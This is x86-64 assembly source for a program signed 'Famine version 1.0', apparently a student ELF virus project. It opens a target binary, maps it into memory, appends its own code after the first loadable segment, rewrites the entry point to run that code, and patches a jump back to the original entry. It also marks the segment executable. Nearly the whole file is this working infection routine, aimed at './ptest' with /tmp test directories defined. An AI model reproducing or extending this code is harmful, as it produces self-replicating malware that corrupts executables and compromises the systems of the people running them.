%define PROG_SIZE   _end - main
%define JMP_OFFSET  jump - main
%define O_RDWR      2
%define O_DIRECTORY 0200000
%define SEEK_END    2
%define PROT_READ   1
%define PROT_WRITE  2
%define MAP_SHARED  1
%define PT_LOAD	    1
%define PF_X        1

%define SYS_OPEN    2
%define SYS_CLOSE   3
%define SYS_LSEEK   8
%define SYS_MMAP    9
%define SYS_MUNMAP  11
%define SYS_EXIT    60

struc   Elf64_Ehdr
    e_ident:     resb 16   ;       /* Magic number and other info */
    e_type:      resw 1    ;		/* Object file type */
    e_machine:   resw 1    ;		/* Architecture */
    e_version:   resd 1    ;		/* Object file version */
    e_entry:     resq 1    ;		/* Entry point virtual address */
    e_phoff:     resq 1    ;		/* Program header table file offset */
    e_shoff:     resq 1    ;		/* Section header table file offset */
    e_flags:     resd 1    ;		/* Processor-specific flags */
    e_ehsize:    resw 1    ;		/* ELF header size in bytes */
    e_phentsize: resw 1    ;		/* Program header table entry size */
    e_phnum:     resw 1    ;		/* Program header table entry count */
    e_shentsize: resw 1    ;		/* Section header table entry size */
    e_shnum:     resw 1    ;		/* Section header table entry count */
    e_shstrndx:  resw 1    ;		/* Section header string table index */
endstruc

struc Elf64_Phdr
    p_type:   resd 1 ;	    /* Segment type */
    p_flags:  resd 1 ;		/* Segment flags */
    p_offset: resq 1 ;		/* Segment file offset */
    p_vaddr:  resq 1 ;	    /* Segment virtual address */
    p_paddr:  resq 1 ;	    /* Segment physical address */
    p_filesz: resq 1 ;		/* Segment size in file */
    p_memsz:  resq 1 ;		/* Segment size in memory */
    p_align:  resq 1 ;		/* Segment alignment */
endstruc

struc famine
    fd:         resq 1
    fileSize:   resq 1
    fileData:   resq 1
    pload:      resq 1
    entry:      resq 1
    oldEntry:   resq 1
endstruc

section .text

global main
extern printf


;    mov rsi, [rsi+8]  first argument 
;    mov rsi, PROG_SIZE     programe size
;   lea rsi, [rel main]    pointeur sur le debut du programe


;    mov rdi, 1
;    lea rsi, [rel main]    écrit le programe
;    mov rdx, PROG_SIZE
;    mov rax, 1
;    syscall

main:
    push rbp
    mov rbp, rsp
    sub rsp, famine_size
    push rdx
    push rcx
    push rdi
    push rsi

;    mov rdi, [rsi+8]
    lea rdi, [rel ptest]
    mov rsi, rsp
    call infect_file

exit:
    mov rdi, 1
    lea rsi, [rel signature]
    mov rdx, 49
    mov rax, 1
    syscall
    pop rsi
    pop rdi
    pop rcx
    pop rdx
    add rsp, famine_size
    leave
    
jump:
    ret
    nop
    nop
    nop
    nop


; void  infect_file(char *filename, t_famine, *famine);
infect_file:
    mov r12, rsi
    mov rsi, O_RDWR
    mov rax, SYS_OPEN
    syscall              ; open(filemane, O_RDWR)
    cmp rax, 0           ; if (fd < 0) return ;
    js exit
    mov [r12 + fd], rax
get_file_data:
    mov rdi, [r12 + fd]
    mov rsi, 0
    mov rdx, SEEK_END
    mov rax, SYS_LSEEK
    syscall             ; lseek(fd, 0, SEEK_END)
    cmp rax, 0          ; if (!size) return ;
    jz exit
    mov [r12 + fileSize], rax
    mov rdi, 0
    mov rsi, [r12 + fileSize]
    mov rdx, PROT_READ | PROT_WRITE
    mov r10, MAP_SHARED ; r10 est le 4 ieme argument car rcx et r11 sont détruit par le kernel
    mov r8, [r12 + fd]
    mov r9, 0
    mov rax, SYS_MMAP
    syscall             ; mmap(0, fileSize, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0)
    cmp rax, 0          ; if (!fileData) return ;
    jz exit
    mov [r12 + fileData], rax   ; faire des check pour le format
    mov rdi, [rax + e_entry]
    mov [r12 + oldEntry], rdi

get_first_pload:
    mov r13, [r12 + fileData]     ; r13 = famine->filedata;
    xor r14, r14                  ; mise a 0
    xor rdi, rdi
    mov di, [r13 + e_phnum]
    mov rsi, [r13 + e_phoff]
    xor rdx, rdx
    mov dx, [r13 + e_phentsize]
    xor rax, rax
phead_loop:
    mov eax, [r13 + rsi + p_type]
    cmp rax, PT_LOAD
    jz first_pload_found
    inc r14
    add rsi, rdx
    cmp r14, rdi
    jl phead_loop
    jmp exit                    ;on quite si il y a pas de pload trouvé
first_pload_found:
    add r13, rsi
    mov [r12 + pload], r13
    mov rdi, [r13 + p_vaddr]
    add rdi, [r13 + p_memsz]
    mov [r12 + entry], rdi
    mov rsi, [r12 + fileData]
    mov [rsi + e_entry], rdi
copy_program:
    mov rdi, [r12 + fileData]
    add rdi, [r13 + p_filesz]
    lea rsi, [rel main]
    mov rdx, PROG_SIZE
    call ft_memcpy
    mov rdx, [r12 + entry]
    add rdx, JMP_OFFSET + 5
    mov rcx, [r12 + oldEntry]
    sub ecx, edx
    mov [rdi + JMP_OFFSET], byte 0xE9
    mov [rdi + JMP_OFFSET + 1], ecx
    add qword [r13 + p_memsz], PROG_SIZE
    add qword [r13 + p_filesz], PROG_SIZE
    or dword [r13 + p_flags], PF_X           ; ajoute les droit d'execution
    
close_all:
    mov rdi, [r12 + fileData]
    mov rsi, [r12 + fileSize]
    mov rax, SYS_MUNMAP 
    syscall             ; munmap(fileData, fileSize)
    mov rdi, [r12 + fd]
    mov rax, SYS_CLOSE  
    syscall             ; close(fd)
    ret

;  void *ft_memcpy(void *dest, void* src, size_t size)
ft_memcpy:
    xor rax, rax
    jmp ft_memcpy_cmp
    ft_memcpy_loop:
    mov bl, [rsi + rax]
    mov [rdi + rax], bl
    inc rax
    ft_memcpy_cmp:
    cmp rax, rdx
    jl ft_memcpy_loop
    mov rax, rdi
    ret


firstDir: db "/tmp/test", 0
secondDir: db "/tmp/test2", 0
ptest: db "./ptest", 0
signature: db "Famine version 1.0 (c)oded by <mtaquet>-<matheme>"
_end:

